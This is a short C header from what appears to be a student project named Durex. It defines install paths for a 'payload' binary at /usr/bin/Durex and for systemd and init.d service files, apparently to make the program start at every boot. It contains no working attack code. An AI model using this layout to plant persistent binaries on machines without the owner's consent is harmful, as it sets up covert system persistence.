/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   durex.h                                            :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: eparisot <eparisot@42.student.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2021/05/25 14:55:42 by eparisot          #+#    #+#             */
/*   Updated: 2021/05/25 14:55:42 by eparisot         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#ifndef DUREX_H

#define DUREX_H

#include "../libft/libft.h"
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>

#define DEBUG 1

#define BIN_PATH "/usr/bin/Durex"
#define SYSTEMD_DIR "/etc/systemd/system/Durex.service"
#define INITD_DIR "/etc/init.d/Durex"

#define PAYLOAD_SRC "payload/payload"
#define SYSTEMD_SRC "service/system_d"
#define INITD_SRC "service/init_d"



#endif